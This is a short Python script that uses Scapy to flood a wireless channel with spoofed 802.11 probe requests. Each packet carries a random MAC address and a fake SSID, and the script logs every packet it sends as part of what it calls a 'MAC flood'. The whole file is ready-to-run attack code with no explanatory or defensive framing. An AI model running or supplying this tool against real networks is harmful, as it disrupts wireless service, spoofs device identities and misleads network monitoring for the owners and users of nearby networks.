#!/usr/bin/env python3

from scapy.all import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt, sendp
import random
import time


iface = "wlan0mon"  # Your monitor mode interface

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def flood_mac_requests(count=1000):
    for _ in range(count):
        src_mac = random_mac()
        ssid = f"FakeAP_{random.randint(0, 9999)}"

        pkt = RadioTap() / \
              Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac) / \
              Dot11ProbeReq() / \
              Dot11Elt(ID="SSID", info=ssid.encode())

        sendp(pkt, iface=iface, verbose=0)
        print(f"[+] Sent fake probe from {src_mac} for SSID '{ssid}'")

try:
    flood_mac_requests()
except KeyboardInterrupt:
    print("\n[!] MAC flood stopped by user.")
